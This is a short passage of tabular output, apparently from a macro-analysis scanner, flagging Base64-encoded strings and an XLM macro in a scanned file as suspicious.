|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|XLM macro           |XLM macro found. It may contain malicious    |
|          |                    |code                                         |
+----------+--------------------+---------------------------------------------+

